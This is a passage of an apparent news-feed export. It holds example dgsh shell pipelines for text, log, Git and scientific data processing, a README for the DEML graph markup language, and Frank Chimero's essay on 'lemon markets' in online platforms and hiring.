avoidance of pass-through constructs to avoid deadlocks.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh export LC_ALL=C tee | {{ # Find errors {{ # Obtain list of words in text tr -cs A-Za-z \\n | tr A-Z a-z | sort -u # Ensure dictionary is compatibly sorted sort /usr/share/dict/words }} | # List errors as a set difference comm -23 # Pass through text cat }} | grep --fixed-strings --file=- --ignore-case --color --word-regex --context=2&lt;/quote&gt;&lt;p&gt;Read text from the standard input and list words containing a two-letter palindrome, words containing four consonants, and words longer than 12 characters.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Consistent sorting across machines export LC_ALL=C # Stream input from file cat $1 | # Split input one word per line tr -cs a-zA-Z \\n | # Create list of unique words sort -u | tee | {{ # Pass through the original words cat # List two-letter palindromes sed 's/.*\(.\)\(.\)\2\1.*/p: \1\2-\2\1/;t g' # List four consecutive consonants sed -E 's/.*([^aeiouyAEIOUY]{4}).*/c: \1/;t g' # List length of words longer than 12 characters awk '{if (length($1) &amp;gt; 12) print "l:", length($1); else print ""}' }} | # Paste the four streams side-by-side paste | # List only words satisfying one or more properties fgrep :&lt;/quote&gt;&lt;p&gt;Creates a report for a fixed-size web log file read from the standard input. Demonstrates the combined use of multipipe blocks, writeval and readval to store and retrieve values, and functions in the scatter block. Used to measure throughput increase achieved through parallelism.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Output the top X elements of the input by the number of their occurrences # X is the first argument toplist() { uniq -c | sort -rn | head -$1 echo } # Output the argument as a section header header() { echo echo "$1" echo "$1" | sed 's/./-/g' } # Consistent sorting export LC_ALL=C export -f toplist export -f header if [ -z "${DGSH_DRAW_EXIT}" ] then cat &amp;lt;&amp;lt;EOF WWW server statistics ===================== Summary ------- EOF fi tee | {{ # Number of accesses echo -n 'Number of accesses: ' dgsh-readval -l -s nAccess # Number of transferred bytes awk '{s += $NF} END {print s}' | tee | {{ echo -n 'Number of Gbytes transferred: ' awk '{print $1 / 1024 / 1024 / 1024}' dgsh-writeval -s nXBytes }} echo -n 'Number of hosts: ' dgsh-readval -l -q -s nHosts echo -n 'Number of domains: ' dgsh-readval -l -q -s nDomains echo -n 'Number of top level domains: ' dgsh-readval -l -q -s nTLDs echo -n 'Number of different pages: ' dgsh-readval -l -q -s nUniqPages echo -n 'Accesses per day: ' dgsh-readval -l -q -s nDayAccess echo -n 'MBytes per day: ' dgsh-readval -l -q -s nDayMB # Number of log file bytes echo -n 'MBytes log file size: ' wc -c | awk '{print $1 / 1024 / 1024}' # Host names awk '{print $1}' | tee | {{ # Number of accesses wc -l | dgsh-writeval -s nAccess # Sorted hosts sort | tee | {{ # Unique hosts uniq | tee | {{ # Number of hosts wc -l | dgsh-writeval -s nHosts # Number of TLDs awk -F. '$NF !~ /[0-9]/ {print $NF}' | sort -u | wc -l | dgsh-writeval -s nTLDs }} # Top 10 hosts {{ call 'header "Top 10 Hosts"' call 'toplist 10' }} }} # Top 20 TLDs {{ call 'header "Top 20 Level Domain Accesses"' awk -F. '$NF !~ /^[0-9]/ {print $NF}' | sort | call 'toplist 20' }} # Domains awk -F. 'BEGIN {OFS = "."} $NF !~ /^[0-9]/ {$1 = ""; print}' | sort | tee | {{ # Number of domains uniq | wc -l | dgsh-writeval -s nDomains # Top 10 domains {{ call 'header "Top 10 Domains"' call 'toplist 10' }} }} }} # Hosts by volume {{ call 'header "Top 10 Hosts by Transfer"' awk ' {bytes[$1] += $NF} END {for (h in bytes) print bytes[h], h}' | sort -rn | head -10 }} # Sorted page name requests awk '{print $7}' | sort | tee | {{ # Top 20 area requests (input is already sorted) {{ call 'header "Top 20 Area Requests"' awk -F/ '{print $2}' | call 'toplist 20' }} # Number of different pages uniq | wc -l | dgsh-writeval -s nUniqPages # Top 20 requests {{ call 'header "Top 20 Requests"' call 'toplist 20' }} }} # Access time: dd/mmm/yyyy:hh:mm:ss awk '{print substr($4, 2)}' | tee | {{ # Just dates awk -F: '{print $1}' | tee | {{ # Number of days uniq | wc -l | tee | {{ awk ' BEGIN { "dgsh-readval -l -x -s nAccess" | getline NACCESS;} {print NACCESS / $1}' | dgsh-writeval -s nDayAccess awk ' BEGIN { "dgsh-readval -l -x -q -s nXBytes" | getline NXBYTES;} {print NXBYTES / $1 / 1024 / 1024}' | dgsh-writeval -s nDayMB }} {{ call 'header "Accesses by Date"' uniq -c }} # Accesses by day of week {{ call 'header "Accesses by Day of Week"' sed 's|/|-|g' | call '(date -f - +%a 2&amp;gt;/dev/null || gdate -f - +%a)' | sort | uniq -c | sort -rn }} }} # Hour {{ call 'header "Accesses by Local Hour"' awk -F: '{print $2}' | sort | uniq -c }} }} dgsh-readval -q -s nAccess }} | cat&lt;/quote&gt;&lt;p&gt;Read text from the standard input and create files containing word, character, digram, and trigram frequencies.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Consistent sorting across machines export LC_ALL=C # Convert input into a ranked frequency list ranked_frequency() { awk '{count[$1]++} END {for (i in count) print count[i], i}' | # We want the standard sort here sort -rn } # Convert standard input to a ranked frequency list of specified n-grams ngram() { local N=$1 perl -ne 'for ($i = 0; $i &amp;lt; length($_) - '$N'; $i++) { print substr($_, $i, '$N'), "\n"; }' | ranked_frequency } export -f ranked_frequency export -f ngram tee | {{ # Split input one word per line tr -cs a-zA-Z \\n | tee | {{ # Digram frequency call 'ngram 2 &amp;gt;digram.txt' # Trigram frequency call 'ngram 3 &amp;gt;trigram.txt' # Word frequency call 'ranked_frequency &amp;gt;words.txt' }} # Store number of characters to use in awk below wc -c | dgsh-writeval -s nchars # Character frequency sed 's/./&amp;amp;\ /g' | # Print absolute call 'ranked_frequency' | awk 'BEGIN { "dgsh-readval -l -x -q -s nchars" | getline NCHARS OFMT = "%.2g%%"} {print $1, $2, $1 / NCHARS * 100}' &amp;gt; character.txt }}&lt;/quote&gt;&lt;p&gt;Given as an argument a directory containing object files, show which symbols are declared with global visibility, but should have been declared with file-local (static) visibility instead. Demonstrates the use of dgsh-capable comm (1) to combine data from two sources.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Find object files find "$1" -name \*.o | # Print defined symbols xargs nm | tee | {{ # List all defined (exported) symbols awk 'NF == 3 &amp;amp;&amp;amp; $2 ~ /[A-Z]/ {print $3}' | sort # List all undefined (imported) symbols awk '$1 == "U" {print $2}' | sort }} | # Print exports that are not imported comm -23&lt;/quote&gt;&lt;p&gt;Given two directory hierarchies A and B passed as input arguments (where these represent a project at different parts of its lifetime) copy the files of hierarchy A to a new directory, passed as a third argument, corresponding to the structure of directories in B. Demonstrates the use of join to process results from two inputs and the use of gather to order asynchronously produced results.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh if [ -z "${DGSH_DRAW_EXIT}" -a \( ! -d "$1" -o ! -d "$2" -o -z "$3" \) ] then echo "Usage: $0 dir-1 dir-2 new-dir-name" 1&amp;gt;&amp;amp;2 exit 1 fi NEWDIR="$3" export LC_ALL=C line_signatures() { find $1 -type f -name '*.[chly]' -print | # Split path name into directory and file sed 's|\(.*\)/\([^/]*\)|\1 \2|' | while read dir file do # Print "directory filename content" of lines with # at least one alphabetic character # The fields are separated by and sed -n "/[a-z]/s|^|$dir$file|p" "$dir/$file" done | # Error: multi-character tab '\001\001' sort -T `pwd` -t -k 2 } export -f line_signatures {{ # Generate the signatures for the two hierarchies call 'line_signatures "$1"' -- "$1" call 'line_signatures "$1"' -- "$2" }} | # Join signatures on file name and content join -t -1 2 -2 2 | # Print filename dir1 dir2 sed 's///g' | awk -F 'BEGIN{OFS=" "}{print $1, $3, $4}' | # Unique occurrences sort -u | tee | {{ # Commands to copy awk '{print "mkdir -p '$NEWDIR'/" $3 ""}' | sort -u awk '{print "cp " $2 "/" $1 " '$NEWDIR'/" $3 "/" $1 ""}' }} | # Order: first make directories, then copy files # TODO: dgsh-tee does not pass along first incoming stream cat | sh&lt;/quote&gt;&lt;p&gt;Process the Git history, and create two PNG diagrams depicting committer activity over time. The most active committers appear at the center vertical of the diagram. Demonstrates image processing, mixining of synchronous and asynchronous processing in a scatter block, and the use of an dgsh-compliant join command.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Commit history in the form of ascending Unix timestamps, emails git log --pretty=tformat:'%at %ae' | # Filter records according to timestamp: keep (100000, now) seconds awk 'NF == 2&amp;amp; $1 &amp;gt; 100000&amp;amp; $1 &amp;lt; '`date +%s` | sort -n | tee | {{ {{ # Calculate number of committers awk '{print $2}' | sort -u | wc -l | tee | {{ dgsh-writeval -s committers1 dgsh-writeval -s committers2 dgsh-writeval -s committers3 }} # Calculate last commit timestamp in seconds tail -1 | awk '{print $1}' # Calculate first commit timestamp in seconds head -1 | awk '{print $1}' }} | # Gather last and first commit timestamp cat | # Make one space-delimeted record tr '\n' ' ' | # Compute the difference in days awk '{print int(($1 - $2) / 60 / 60 / 24)}' | # Store number of days dgsh-writeval -s days sort -k2 # &amp;lt;timestamp, email&amp;gt; # Place committers left/right of the median # according to the number of their commits awk '{print $2}' | sort | uniq -c | sort -n | awk ' BEGIN { "dgsh-readval -l -x -q -s committers1" | getline NCOMMITTERS l = 0; r = NCOMMITTERS;} {print NR % 2 ? l++ : --r, $2}' | sort -k2 # &amp;lt;left/right, email&amp;gt; }} | # Join committer positions with commit time stamps # based on committer email join -j 2 | # &amp;lt;email, timestamp, left/right&amp;gt; # Order by timestamp sort -k 2n | tee | {{ # Create portable bitmap echo 'P1' {{ dgsh-readval -l -q -s committers2 dgsh-readval -l -q -s days }} | cat | tr '\n' ' ' | awk '{print $1, $2}' perl -na -e ' BEGIN { open(my $ncf, "-|", "dgsh-readval -l -x -q -s committers3"); $ncommitters = &amp;lt;$ncf&amp;gt;; @empty[$ncommitters - 1] = 0; @committers = @empty; } sub out { print join("", map($_ ? "1" : "0", @committers)), "\n"; } $day = int($F[1] / 60 / 60 / 24); $pday = $day if (!defined($pday)); while ($day != $pday) { out(); @committers = @empty; $pday++; } $committers[$F[2]] = 1; END { out(); } ' }} | cat | # Enlarge points into discs through morphological convolution pgmmorphconv -erode &amp;lt;( cat &amp;lt;&amp;lt;EOF P1 7 7 1 1 1 0 1 1 1 1 1 0 0 0 1 1 1 0 0 0 0 0 1 0 0 0 0 0 0 0 1 0 0 0 0 0 1 1 1 0 0 0 1 1 1 1 1 0 1 1 1 EOF ) | tee | {{ # Full-scale image pnmtopng &amp;gt;large.png # A smaller image pamscale -width 640 | pnmtopng &amp;gt;small.png }}&lt;/quote&gt;&lt;p&gt;Count number of times each word appears in the specified input file(s) Demonstrates parallel execution mirroring the Hadoop WordCount example via the dgsh-parallel command. In contrast to GNU parallel, the block generated by dgsh-parallel has N input and output streams, which can be combined by any dgsh-compatible tool, such as dgsh-merge-sum or sort -m.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Number of processes N=8 # Collation order for sorting export LC_ALL=C # Scatter input dgsh-tee -s | # Emulate Java's default StringTokenizer, sort, count dgsh-parallel -n $N "tr -s ' \t\n\r\f' '\n' | sort -S 512M | uniq -c" | # Merge sorted counts by providing N input channels dgsh-merge-sum $(for i in $(seq $N) ; do printf '&amp;lt;| ' ; done)&lt;/quote&gt;&lt;p&gt;Given the specification of two publication venues, read a compressed DBLP computer science bibliography from the standard input (e.g. piped from curl -s http://dblp.uni-trier.de/xml/dblp.xml.gz or from a locally cached copy) and output the number of papers published in each of the two venues as well as the number of authors who have published only in the first venue, the number who have published only in the second one, and authors who have published in both. The venues are specified through the script's first two command-line arguments as a DBLP key prefix, e.g. journals/acta/, conf/icse/, journals/software/, conf/iwpc/, or conf/msr/. Demonstrates the use of dgsh-wrap -e to have sed(1) create two output streams and the use of tee to copy a pair of streams into four ones.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Extract and sort author names sorted_authors() { sed -n 's/&amp;lt;author&amp;gt;\([^&amp;lt;]*\)&amp;lt;\/author&amp;gt;/\1/p' | sort } # Escape a string to make it a valid sed(1) pattern escape() { echo "$1" | sed 's/\([/\\]\)/\\\1/g' } export -f sorted_authors if [ ! "$2" -a ! "$DGSH_DOT_DRAW"] ; then echo "Usage: $0 key1 key2" 1&amp;gt;&amp;amp;2 echo "Example: $0 conf/icse/ journals/software/" 1&amp;gt;&amp;amp;2 exit 1 fi gzip -dc | # Output the two venue authors as two output streams dgsh-wrap -e sed -n " /^&amp;lt;.*key=\"$(escape $1)/,/&amp;lt;title&amp;gt;/ w &amp;gt;| /^&amp;lt;.*key=\"$(escape $2)/,/&amp;lt;title&amp;gt;/ w &amp;gt;|" | # 2 streams in 4 streams out: venue1, venue2, venue1, venue2 tee | {{ {{ echo -n "$1 papers: " grep -c '^&amp;lt;.* mdate=.* key=' echo -n "$2 papers: " grep -c '^&amp;lt;.* mdate=.* key=' }} {{ call sorted_authors call sorted_authors }} | comm | {{ echo -n "Authors only in $1: " wc -l echo -n "Authors only in $2: " wc -l echo -n 'Authors common in both venues: ' wc -l }} }} | cat&lt;/quote&gt;&lt;p&gt;Create two graphs: 1) a broadened pulse and the real part of its 2D Fourier transform, and 2) a simulated air wave and the amplitude of its 2D Fourier transform. Demonstrates using the tools of the Madagascar shared research environment for computational data analysis in geophysics and related fields. Also demonstrates the use of two scatter blocks in the same script, and the used of named streams.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh mkdir -p Fig # The SConstruct SideBySideIso "Result" method side_by_side_iso() { vppen size=r vpstyle=n gridnum=2,1 /dev/stdin $* } export -f side_by_side_iso # A broadened pulse and the real part of its 2D Fourier transform sfspike n1=64 n2=64 d1=1 d2=1 nsp=2 k1=16,17 k2=5,5 mag=16,16 \ label1='time' label2='space' unit1= unit2= | sfsmooth rect2=2 | sfsmooth rect2=2 | tee | {{ sfgrey pclip=100 wanttitle=n sffft1 | sffft3 axis=2 pad=1 | sfreal | tee | {{ sfwindow f1=1 | sfreverse which=3 cat }} | sfcat axis=1 "&amp;lt;|" | sfgrey pclip=100 wanttitle=n label1="1/time" label2="1/space" }} | call_with_stdin side_by_side_iso '&amp;lt;|' yscale=1.25 &amp;gt;Fig/ft2dofpulse.vpl # A simulated air wave and the amplitude of its 2D Fourier transform sfspike n1=64 d1=1 o1=32 nsp=4 k1=1,2,3,4 mag=1,3,3,1 \ label1='time' unit1= | sfspray n=32 d=1 o=0 | sfput label2=space | sflmostretch delay=0 v0=-1 | tee | {{ sfwindow f2=1 | sfreverse which=2 cat }} | sfcat axis=2 "&amp;lt;|" | tee | {{ sfgrey pclip=100 wanttitle=n sffft1 | sffft3 sign=1 | tee | {{ sfreal sfimag }} | dgsh-wrap -e sfmath nostdin=y re="&amp;lt;|" im="&amp;lt;|" \ output="sqrt(re*re+im*im)" | tee | {{ sfwindow f1=1 | sfreverse which=3 cat }} | sfcat axis=1 "&amp;lt;|" | sfgrey pclip=100 wanttitle=n label1="1/time" label2="1/space" }} | call_with_stdin side_by_side_iso '&amp;lt;|' yscale=1.25 &amp;gt;Fig/airwave.vpl wait&lt;/quote&gt;&lt;p&gt;Nuclear magnetic resonance in-phase/anti-phase channel conversion and processing in heteronuclear single quantum coherence spectroscopy. Demonstrate processing of NMR data using the NMRPipe family of programs.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # The conversion is configured for the following file: # http://www.bmrb.wisc.edu/ftp/pub/bmrb/timedomain/bmr6443/timedomain_data/c13-hsqc/june11-se-6426-CA.fid/fid var2pipe -in $1 \ -xN 1280 -yN 256 \ -xT 640 -yT 128 \ -xMODE Complex -yMODE Complex \ -xSW 8000 -ySW 6000 \ -xOBS 599.4489584 -yOBS 60.7485301 \ -xCAR 4.73 -yCAR 118.000 \ -xLAB 1H -yLAB 15N \ -ndim 2 -aq2D States \ -verb | tee | {{ # IP/AP channel conversion # See http://tech.groups.yahoo.com/group/nmrpipe/message/389 nmrPipe | nmrPipe -fn SOL | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 2 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 177 -p1 0.0 -di | nmrPipe -fn EXT -left -sw -verb | nmrPipe -fn TP | nmrPipe -fn COADD -cList 1 0 -time | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 1 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 0 -p1 0 -di | nmrPipe -fn TP | nmrPipe -fn POLY -auto -verb &amp;gt;A nmrPipe | nmrPipe -fn SOL | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 2 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 177 -p1 0.0 -di | nmrPipe -fn EXT -left -sw -verb | nmrPipe -fn TP | nmrPipe -fn COADD -cList 0 1 -time | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 1 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 -90 -p1 0 -di | nmrPipe -fn TP | nmrPipe -fn POLY -auto -verb &amp;gt;B }} # We use temporary files rather than streams, because # addNMR mmaps its input files. The diagram displayed in the # example shows the notional data flow. if [ -z "${DGSH_DRAW_EXIT}" ] then addNMR -in1 A -in2 B -out A+B.dgsh.ft2 -c1 1.0 -c2 1.25 -add addNMR -in1 A -in2 B -out A-B.dgsh.ft2 -c1 1.0 -c2 1.25 -sub fi&lt;/quote&gt;&lt;p&gt;Calculate the iterative FFT for n = 8 in parallel. Demonstrates combined use of permute and multipipe blocks.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh dgsh-fft-input $1 | perm 1,5,3,7,2,6,4,8 | {{ {{ dgsh-w 1 0 dgsh-w 1 0 }} | perm 1,3,2,4 | {{ dgsh-w 2 0 dgsh-w 2 1 }} {{ dgsh-w 1 0 dgsh-w 1 0 }} | perm 1,3,2,4 | {{ dgsh-w 2 0 dgsh-w 2 1 }} }} | perm 1,5,3,7,2,6,4,8 | {{ dgsh-w 3 0 dgsh-w 3 1 dgsh-w 3 2 dgsh-w 3 3 }} | perm 1,5,2,6,3,7,4,8 | cat&lt;/quote&gt;&lt;p&gt;Reorder columns in a CSV document. Demonstrates the combined use of tee, cut, and paste.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh tee | {{ cut -d , -f 5-6 - cut -d , -f 2-4 - }} | paste -d ,&lt;/quote&gt;&lt;p&gt; Windows-like DIR command for the current directory. Nothing that couldn't be done with &lt;code&gt;ls -l | awk&lt;/code&gt;.
Demonstrates use of wrapped commands with no input (df, echo).
&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh ls -n | tee | {{ # Reorder fields in DIR-like way awk '!/^total/ {print $6, $7, $8, $1, sprintf("%8d", $5), $9}' # Count number of files wc -l | tr -d \\n # Print label for number of files echo -n ' File(s) ' # Tally number of bytes awk '{s += $5} END {printf("%d bytes\n", s)}' # Count number of directories grep -c '^d' | tr -d \\n # Print label for number of dirs and calculate free bytes df -h . | awk '!/Use%/{print " Dir(s) " $4 " bytes free"}' }} | cat&lt;/quote&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www2.dmst.aueb.gr/dds/sw/dgsh/"/><published>2025-09-30T13:39:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425714</id><title>Deml: The Directed Acyclic Graph Elevation Markup Language</title><updated>2025-09-30T17:09:34.382894+00:00</updated><content>&lt;doc fingerprint="24003ae74061c391"&gt;
  &lt;main&gt;
    &lt;p&gt;Languages designed to represent all types of graph data structures, such as Graphviz's DOT Language and Mermaid JS's flowchart syntax, don't take advantage of the properties specific to DAGs (Directed Acyclic Graphs).&lt;/p&gt;
    &lt;p&gt;DAGs act like rivers. Water doesn't flow upstream (tides and floods being exceptions). Sections of a river at the same elevation can't be the inputs or outputs of each other, like the nodes C, D, and E in the image below. Their input is B. C outputs to F, while D and E output to G.&lt;/p&gt;
    &lt;p&gt;DEML's goal is to use this ordering as part of the file syntax to make it easier for humans to parse. In DEML we represent an elevation marker with &lt;code&gt;----&lt;/code&gt; on a new line. The order of elevation clusters is significant, but the order of nodes between two &lt;code&gt;----&lt;/code&gt; elevation markers is not significant.&lt;/p&gt;
    &lt;code&gt;UpRiver &amp;gt; A
----
A &amp;gt; B
----
B &amp;gt; C | D | E
----
C
D
E
----
F &amp;lt; C
G &amp;lt; D | E &amp;gt; DownRiver
----
DownRiver &amp;lt; F&lt;/code&gt;
    &lt;p&gt;Nodes are defined by the first word on a line. The defined node can point to its outputs with &lt;code&gt;&amp;gt;&lt;/code&gt; and to its inputs with &lt;code&gt;&amp;lt;&lt;/code&gt;. Inputs and outputs are separated by &lt;code&gt;|&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Dagrs is a library for running multiple tasks with dependencies defined in a DAG. In DEML, shell commands can be assigned to a node with &lt;code&gt;=&lt;/code&gt;. DEML files can be run via dag-rs with the comand &lt;code&gt;deml run -i &amp;lt;filepath&amp;gt;&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To compare the difference in readability, here is the Dagrs YAML example in both YAML and DEML&lt;/p&gt;
    &lt;code&gt;dagrs:
  a:
    name: "Task 1"
    after: [ b, c ]
    cmd: echo a
  b:
    name: "Task 2"
    after: [ c, f, g ]
    cmd: echo b
  c:
    name: "Task 3"
    after: [ e, g ]
    cmd: echo c
  d:
    name: "Task 4"
    after: [ c, e ]
    cmd: echo d
  e:
    name: "Task 5"
    after: [ h ]
    cmd: echo e
  f:
    name: "Task 6"
    after: [ g ]
    cmd: python3 ./tests/config/test.py
  g:
    name: "Task 7"
    after: [ h ]
    cmd: node ./tests/config/test.js
  h:
    name: "Task 8"
    cmd: echo h&lt;/code&gt;
    &lt;code&gt;H &amp;gt; E | G = echo h
----
G = node ./tests/config/test.js
E = echo e
----
F &amp;lt; G = python3 ./tests/config/test.py
C &amp;lt; E | G = echo c
----
B &amp;lt; C | F | G = echo b
D &amp;lt; C | E = echo d
----
A &amp;lt; B | C = echo a&lt;/code&gt;
    &lt;p&gt;To convert DEML files to Mermaid Diagram files (.mmd) use the command &lt;code&gt;deml mermaid -i &amp;lt;inputfile&amp;gt; -o &amp;lt;outputfile&amp;gt;&lt;/code&gt;. The mermaid file can be used to generate an image at mermaid.live&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Put my idea for an elevation based DAG representation into the wild&lt;/item&gt;
      &lt;item&gt;Run DAGs with dag-rs&lt;/item&gt;
      &lt;item&gt;Convert DEML files to Mermaid Diagram files&lt;/item&gt;
      &lt;item&gt;Syntax highlighting tree-sitter-deml&lt;/item&gt;
      &lt;item&gt;Add a syntax to label edges&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was thinking about how it's annoying in languages like C when function declaration order matters. Then I wondered if there could be a case when it would be a nice feature for declaration order to matter and I thought of DAGs.&lt;/p&gt;
    &lt;p&gt;Licensed under either of&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Apache License, Version 2.0 (LICENSE-APACHE or http://www.apache.org/licenses/LICENSE-2.0)&lt;/item&gt;
      &lt;item&gt;MIT license (LICENSE-MIT or http://opensource.org/licenses/MIT)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;at your option.&lt;/p&gt;
    &lt;p&gt;Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/Mcmartelle/deml"/><published>2025-09-30T14:12:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425746</id><title>Frank Chimero: I think we're in the lemon stage of the internet</title><updated>2025-09-30T17:09:34.192140+00:00</updated><content>&lt;doc fingerprint="37e8105b91834f8a"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Selling Lemons&lt;/head&gt;
    &lt;head rend="h2"&gt;The hidden costs of the meta game&lt;/head&gt;
    &lt;p&gt;I’ve been researching a new talk the last few weeks and along the way stumbled across a concept that’s been rattling around in my head. I am writing to share, because I find it a satisfying description for the tech flop era.&lt;/p&gt;
    &lt;p&gt;The idea is called “a market for lemons.” The phrase comes from a 1970 paper by George Akerlof that explains how information asymmetry between buyers and sellers can undermine a marketplace. Akerlof asks us to imagine ourselves buying a used car. Some cars on the lot are reliable, well-maintained gems. Others cars are lemons, the kinds of cars that can make it off the lot but are disasters waiting to happen. The sellers know which cars are which, but you, as a buyer, can’t tell the difference. That information asymmetry affects the average price in the market and eventually impacts the overall market dynamics.&lt;/p&gt;
    &lt;p&gt;The thinking goes like this: if a buyer can’t distinguish between good and bad, everything gets priced somewhere in the middle. If you’re selling junk, this is fantastic news—you’ll probably get paid more than your lemon is worth. If you’re selling a quality used car, this price is insultingly low. As a result, people with good cars leave the market to sell their stuff elsewhere, which pushes the overall quality and price down even further, until eventually all that’s left on the market are lemons.&lt;/p&gt;
    &lt;p&gt;I think we’re in the lemon stage of the internet.&lt;/p&gt;
    &lt;p&gt;I thought about this last week while shopping online for a sleep mask. Brands like MZOO, YFONG, WAOAW popped up, and these seemed less like companies and more like vowel smoke ejected from a factory flue hole, then slotted into a distribution platform. The long tail of generic brands on e-commerce platforms is a textbook lemons market: good products get drowned out by these alphabet soup products, who use their higher margins to buy sponsored placement in search results. Both buyers and sellers eventually lose (and perhaps the platforms win, as long as they don’t wear out their reputation).&lt;/p&gt;
    &lt;p&gt;For shoppers, buying online now feels like rolling the dice on the quality of the product. For sellers, the gamble is that their survival relies more on gaming the system than actually improving the product.&lt;/p&gt;
    &lt;p&gt;I think the post-pandemic experience has been a collective realization that the value that drew us to certain digital products and marketplaces is gone. Much of this reduction in value gets pinned to ZIRP, but there’s another critical factor—the natural flight of value creators. As platforms matured, the users and sellers who generated real value were squeezed out by players focused on capturing value rather than creating it.&lt;/p&gt;
    &lt;p&gt;Once you identify a lemon market, you start to see it all over the place.&lt;/p&gt;
    &lt;p&gt;Online dating. A lemon market where participants have no familiarity with one another participate in strategic self-presentation. High-quality partners (emotionally available, looking for genuine connection) can’t effectively distinguish themselves from those just seeking validation and eventually leave.&lt;/p&gt;
    &lt;p&gt;Search results. A lemon market where platforms profit from sponsored placement, misaligning incentives with user needs. The first page is a minefield: sponsored listings posing as organic results, SEO content farms, affiliate aggregators. You add “reddit” to work around this, but even that has less success these days.&lt;/p&gt;
    &lt;p&gt;Social media. Your feed is now professional content creators, low-effort podcast video clips, algorithmic filler reaction videos, stand-up chaff, and animals. Good ideas don’t happen frequently enough to satisfy the pace of the algorithm, so many have pivoted to newsletters or stopped posting.&lt;/p&gt;
    &lt;p&gt;What makes the Market for Lemons concept so appealing (and what differentiates it in my mind from enshittification is that everyone can be acting reasonably, pursuing their own interests, and things still get worse for everyone. No one has to be evil or stupid: the platform does what’s profitable, sellers do what works, buyers try to make smart decisions, and yet the whole system degrades into something nobody actually wants.&lt;/p&gt;
    &lt;p&gt;I was first introduced to the Market of Lemons by Dan Luu in an essay titled, Why is it so hard to buy things that work well?. Luu applies the market of lemons as a metaphor, and specifically identifies hiring as a market of lemons, because of the information asymmetry for both companies and individuals.&lt;/p&gt;
    &lt;p&gt;Companies have always struggled to tell the difference between great individual contributors and mediocre ones. Lacking a clear way to separate the two, they lump everyone together and rely on proxy games to evaluate skill. Candidates, for their part, walk into interviews without crucial information: whether the company is quietly dysfunctional, whether the manager they liked during interviews is about to quit, or whether the open role itself is little more than a vestige of an abandoned strategy that’s likely to be cut once the other foot drops. The usual signals of strength or weakness don’t signify much at all when it comes to hiring. Layer on the automated scale of the application process—candidates firing off applications by the hundreds, companies screening by the thousands—and the result is a highly inefficient market that wastes everyone’s time. Meaningful signals get drowned out, everyone gets lumped together, rational players opt out to the extent they are able, and the market slides steadily downward.&lt;/p&gt;
    &lt;p&gt;There have been countless attempts to make hiring more rational and efficient—the stuff of startup pitch deck lore. But I’m not sure hiring can ever be much more efficient, because neither side has reason to show themselves as they really are, warts and all. Idealistically, both would come straight; pragmatically, it is a game of chicken. Candidates polish résumés and present curated versions of their abilities, listing outcomes and impact statistics with dubious accuracy and provenance. Companies do the same, putting culture and mission front and center while hiding systematic dysfunctions and looming existential risks. When neither side is forthcoming, you’re left with proxies: a famous logo on a resume, a polished culture deck. Gaming the meta of the system supersedes the actual development or evaluation of skill. And, much to my disappointment, gaming the meta may, in fact, be an essential aspect of most jobs.&lt;/p&gt;
    &lt;p&gt;At this point, it should be obvious how the market for lemons applies to ill-considered AI-generated content. I’ll let you sketch out that argument yourself since it’s fairly straightforward, and this thing is already long enough.&lt;/p&gt;
    &lt;p&gt;Instead, let’s zag and revisit my point earlier about system-gaming becoming the most viable playbook instead of focusing on the product. As a consumer and as a designer, I hope this is a temporary state before a massive recalibration. The primacy of meta-activities—optimizing for algorithms, visibility theater, consumer entrapment, externalization of costs, performative internal alignment, horse-trading amongst a set of DOA ideas—is poison. It is a road to nowhere worth going.&lt;/p&gt;
    &lt;p&gt;This reflects a business culture obsessed with outcomes while treating outputs as speed bumps. But outputs (code, design, the products themselves) are the load-bearing work—the actual prerequisites for the outcomes desired. Focusing on outcomes while ignoring outputs means hiding in abstractions and absolving oneself of accountability. If any output is acceptable to hit your targets, what awful things emerge at scale? What horrors happen when success detaches completely from the necessity of being good—having both skill and ethics?&lt;/p&gt;
    &lt;p&gt;The safest, smartest path is also the most mundane: keep the main thing the main thing. Outcomes matter, but output literally comes first. Outputs are the business to everyone outside it—what customers see, buy, and use. You can’t stay safe in abstractions forever. Eventually, you must attend to the reality of what’s in front of you, because that’s where work gets done and where assumptions get validated or falsified (because reality has a surprising amount of detail).&lt;/p&gt;
